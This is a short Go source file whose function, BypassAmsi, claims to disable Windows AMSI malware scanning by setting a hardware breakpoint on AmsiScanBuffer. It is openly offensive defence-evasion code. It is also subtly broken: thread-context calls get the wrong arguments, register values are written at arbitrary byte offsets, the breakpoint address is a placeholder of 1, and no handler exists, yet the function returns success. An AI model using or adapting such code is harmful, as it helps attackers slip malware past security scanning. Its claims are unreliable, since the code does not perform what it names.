package amsi_etw

import (
"syscall"
"unsafe"
)

type HardwareBreakpoint struct{}

func NewHardwareBreakpoint() *HardwareBreakpoint {
return &HardwareBreakpoint{}
}

func (h *HardwareBreakpoint) BypassAmsi() error {
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procSetThreadContext := kernel32.NewProc("SetThreadContext")
procGetThreadContext := kernel32.NewProc("GetThreadContext")

var ctx [1024]byte
procGetThreadContext.Call(uintptr(unsafe.Pointer(&ctx)), 0x10007)

// Set hardware breakpoint at AMSI scan function
// DR0 = address of AmsiScanBuffer
// DR7 = 0x1 (enable breakpoint)

ctx[8] = 0x01 // DR0 low byte
ctx[4*7] = 0x1 // DR7 enable

procSetThreadContext.Call(uintptr(unsafe.Pointer(&ctx)), 0x10007)

// Continue execution - breakpoint will trigger
syscall.Sleep(100)
return nil
}
